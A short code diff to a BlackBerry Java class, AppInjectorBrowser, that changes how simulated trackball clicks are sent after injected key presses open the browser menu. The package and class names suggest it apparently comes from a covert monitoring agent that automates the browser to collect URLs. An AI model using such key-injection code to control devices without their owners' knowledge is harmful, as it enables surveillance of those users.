@@ -2,6 +2,7 @@ package blackberry.agent.url;
 
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
+import blackberry.Device;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.AppInjectorInterface;
@@ -59,9 +60,12 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         Utils.sleep(500);
         KeyInjector.pressRawKey(menu.toString().charAt(0));
         Utils.sleep(500);
-        //KeyInjector.trackBallClick();
-        KeyInjector.trackBallRawClick();
-
+        
+        if(Device.getInstance().hasAdvancedClick){
+            KeyInjector.trackBallClick();
+        }else{
+            KeyInjector.trackBallRawClick();
+        }
         return true;
     }
 
